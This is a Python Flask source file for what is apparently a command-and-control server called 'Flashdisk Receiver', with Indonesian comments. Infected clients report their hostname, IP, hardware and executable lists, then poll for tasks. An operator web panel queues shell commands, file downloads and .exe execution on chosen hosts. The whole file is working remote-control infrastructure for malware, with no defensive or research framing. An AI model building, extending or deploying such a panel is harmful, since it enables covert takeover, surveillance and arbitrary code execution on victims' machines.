from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json

app = Flask(__name__)

# Penyimpanan di memori (hilang jika serverless cold start, tapi cukup untuk demo)
clients = {}
commands = {}  # {hostname: [list_of_commands]}

# Template HTML sederhana (tanpa peta, tapi fungsional)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Flashdisk Receiver</title>
    <style>
        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
        pre { background: #111; padding: 5px; }
    </style>
</head>
<body>
    <h1>⚡ FLASHDISK RECEIVER (Memory Mode)</h1>
    <h2>Connected Clients:</h2>
    <table>
        <tr><th>Hostname</th><th>IP</th><th>Last Seen</th><th>Hardware</th></tr>
        {% for host, data in clients.items() %}
        <tr>
            <td>{{ host }}</td>
            <td>{{ data.ip }}</td>
            <td>{{ data.last_seen }}</td>
            <td><pre>{{ data.hardware|tojson(indent=2) }}</pre></td>
        </tr>
        {% endfor %}
    </table>
    <hr>
    <h2>Send Command to Client</h2>
    <form id="cmdForm">
        <select id="cmdType">
            <option value="text">Pesan Teks</option>
            <option value="run">Run CMD</option>
            <option value="download">Download File</option>
            <option value="exec_exe">Jalankan .exe</option>
        </select>
        <input type="text" id="cmdData" placeholder="Isi perintah / URL / nama file" style="width:300px;">
        <button type="button" onclick="sendCommand()">Kirim</button>
    </form>
    <div id="cmdResult"></div>
    <h2>Command History</h2>
    <div id="history"></div>
    <script>
        async function loadClients() {
            const res = await fetch('/api/clients');
            const clients = await res.json();
            // we just refresh page for simplicity
            location.reload();
        }
        async function sendCommand() {
            const hostname = prompt("Masukkan hostname client (lihat tabel di atas):");
            if (!hostname) return;
            const cmdType = document.getElementById('cmdType').value;
            const cmdData = document.getElementById('cmdData').value;
            if (!cmdData) return;
            const res = await fetch('/api/send_command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({hostname, command_type: cmdType, command_data: cmdData})
            });
            const result = await res.json();
            document.getElementById('cmdResult').innerHTML = result.status === 'ok' ? '✅ Perintah dikirim' : '❌ Gagal';
            setTimeout(() => document.getElementById('cmdResult').innerHTML = '', 3000);
        }
        setInterval(() => loadClients(), 15000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE, clients=clients)

@app.route('/report', methods=['POST'])
def handle_report():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No JSON"}), 400
        hostname = data.get('hostname')
        ip = data.get('ip')
        hardware = data.get('hardware', {})
        executables = data.get('executables', [])
        clients[hostname] = {
            'ip': ip,
            'hardware': hardware,
            'executables': executables,
            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        print(f"[REPORT] {hostname} ({ip}) - {len(executables)} exe files")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Error in /report: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/poll_commands', methods=['POST'])
def poll_commands():
    data = request.get_json()
    hostname = data.get('hostname')
    if not hostname:
        return jsonify([])
    pending = []
    if hostname in commands:
        for cmd in commands[hostname]:
            if cmd['status'] == 'pending':
                pending.append({
                    'id': cmd['id'],
                    'command_type': cmd['command_type'],
                    'command_data': cmd['command_data']
                })
                cmd['status'] = 'sent'  # mark as sent to avoid re-polling
    return jsonify(pending)

@app.route('/command_result', methods=['POST'])
def command_result():
    data = request.get_json()
    cmd_id = data.get('command_id')
    status = data.get('status')
    result = data.get('result', '')
    # Update command status in memory (need to find which hostname)
    # To simplify, we ignore because we don't need result for now.
    return jsonify({"ok": True})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.get_json()
    hostname = data.get('hostname')
    cmd_type = data.get('command_type')
    cmd_data = data.get('command_data')
    if not hostname or not cmd_type or not cmd_data:
        return jsonify({'message': 'Missing fields'}), 400
    if hostname not in commands:
        commands[hostname] = []
    cmd_id = len(commands[hostname]) + 1
    commands[hostname].append({
        'id': cmd_id,
        'command_type': cmd_type,
        'command_data': cmd_data,
        'status': 'pending',
        'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({'status': 'ok'}), 200

@app.route('/api/clients')
def list_clients():
    return jsonify([{'hostname': h, 'ip': c['ip'], 'last_seen': c['last_seen']} for h, c in clients.items()])

@app.route('/api/client/<hostname>')
def get_client(hostname):
    if hostname in clients:
        return jsonify({'hostname': hostname, 'hardware': clients[hostname]['hardware']})
    return jsonify({'error': 'not found'}), 404

@app.route('/api/client/location/<hostname>')
def client_location(hostname):
    # Default location (Jakarta)
    return jsonify({'lat': -6.2, 'lon': 106.8, 'city': 'Jakarta', 'region': 'Jakarta'})

@app.route('/api/commands/<hostname>')
def list_commands_route(hostname):
    cmds = commands.get(hostname, [])
    return jsonify(cmds)

if __name__ == '__main__':
    app.run(debug=True)
